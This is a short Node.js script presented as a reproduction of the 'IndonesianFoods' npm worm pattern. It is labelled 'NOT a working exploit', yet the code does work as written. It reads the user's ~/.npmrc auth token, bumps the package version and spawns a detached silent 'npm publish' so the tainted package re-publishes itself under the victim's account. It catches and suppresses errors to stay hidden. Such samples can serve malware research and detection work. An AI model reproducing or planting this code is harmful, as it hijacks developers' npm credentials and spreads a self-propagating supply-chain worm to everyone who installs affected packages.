// IndonesianFoods (2024-2026 ongoing) pattern reproduction — NOT a working exploit.
// Postinstall worm: reads npm auth, then runs `npm version patch` + `npm publish`
// from the current package to re-publish a tainted version using the harvested token.

const { execSync, spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

try {
  // Step 1: harvest npm auth token from the user's .npmrc
  const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  const m = npmrc.match(/_authToken=([^\s]+)/);
  if (!m) process.exit(0);

  // Step 2: bump version
  execSync('npm version patch --no-git-tag-version', { stdio: 'ignore' });

  // Step 3: publish (uses harvested token implicitly via npmrc)
  spawn('npm', ['publish', '--access', 'public'], { detached: true, stdio: 'ignore' });
} catch (_) {
  // fail silent on benign environments
}
